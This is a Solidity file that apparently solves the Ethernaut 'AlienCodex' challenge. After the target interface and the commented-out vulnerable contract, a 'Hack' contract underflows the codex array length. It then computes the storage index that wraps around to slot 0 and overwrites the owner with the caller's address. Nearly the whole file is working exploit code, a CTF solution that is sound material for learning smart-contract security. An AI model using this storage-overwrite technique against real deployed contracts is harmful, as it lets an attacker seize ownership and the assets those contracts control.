// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IAlienCodex {
  function owner() external view returns (address);
  function make_contact() external;
  function retract() external;
  function revise(uint i, bytes32 _content) external;
  function codex(uint256) external view returns (bytes32);
}

// contract AlienCodex is Ownable {

//   bool public contact;
//   bytes32[] public codex;

//   modifier contacted() {
//     assert(contact);
//     _;
//   }
  
//   function make_contact() public {
//     contact = true;
//   }

//   function record(bytes32 _content) contacted public {
//     codex.push(_content);
//   }

//   function retract() contacted public {
//     codex.length--;
//   }

//   function revise(uint i, bytes32 _content) contacted public {
//     codex[i] = _content;
//   }
// }

contract Hack {
  constructor(IAlienCodex target) {
    target.make_contact();
    target.retract();
    uint256 lastSlotArray = uint256(keccak256(abi.encode(uint256(1))));
    uint256 ownerIndex;
    unchecked {
      ownerIndex -= lastSlotArray;
    }
    target.revise(ownerIndex, bytes32(uint256(uint160(msg.sender))));
    require(target.owner() == msg.sender, "failed");
  }
}